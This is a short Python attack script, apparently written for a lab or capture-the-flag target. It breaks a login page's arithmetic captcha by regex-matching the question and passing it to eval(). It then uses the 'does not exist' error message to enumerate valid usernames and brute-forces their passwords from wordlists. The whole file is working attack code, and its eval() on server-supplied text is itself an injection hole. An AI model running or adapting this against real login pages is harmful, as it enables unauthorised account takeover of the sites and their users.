import requests, re

ip = ""
url = f"http://{ip}/login"

with open("usernames.txt", "rt") as fd:
	usernames = fd.read().splitlines()
	
with open("passwords.txt", "rt") as fd:
	passwords = fd.read().splitlines()

regex = re.compile(r"(\d+\s[+*/-]\s\d+)\s\=\s\?")

def send_post(username, password, captcha=None):
	data = {
		"username":username,
		"password":password,
	}
	if captcha:
		data.update({"captcha":captcha})
	response = requests.post(url=url, data=data)
	return response

def solve_captcha(response):
    captcha = re.findall(regex, response.text)[0]
    return eval(captcha)

for count in range(100):
	response = send_post("darthvader", "lukesfather")
	try:
		captcha = solve_captcha(response)
		print(f"Captcha synchronised! Next solution is: {captcha}")
		break
	except:
		pass

for username in usernames:
		response = send_post(username, "None", captcha)
		captcha = solve_captcha(response)
		if not "does not exist" in response.text:
			for password in passwords:
				response = send_post(username, password, captcha)
				if not "Error" in response.text:
					print(f"Success! Username:{username} Password:{password}")
					exit(0)
				else:
					captcha = solve_captcha(response)
